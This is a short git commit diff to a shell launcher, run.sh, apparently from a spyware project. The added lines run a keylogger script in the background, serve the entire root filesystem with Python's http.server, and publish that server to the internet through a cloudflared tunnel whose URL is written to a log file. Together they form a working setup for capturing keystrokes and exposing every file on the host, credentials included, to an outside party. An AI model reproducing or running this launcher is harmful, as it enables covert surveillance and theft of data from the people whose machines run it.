421b13aed7ea479b22933db158bd9fb27bcde5e9
Atish03 <atishpersonal003@gmail.com>
2022-03-25 12:41:25 +0530

    server files

--- run.sh
+++ run.sh
@@ -1,5 +1,7 @@
 #!/bin/bash
 pip3 install -r requirements.txt
 python3 main.py r &
-python3 keylogger.py
+python3 keylogger.py &
+python3 -m http.server --directory / &
+stdbuf -oL cloudflare/Linux/cloudflared --url=http://localhost:8000 &> log.txt
 
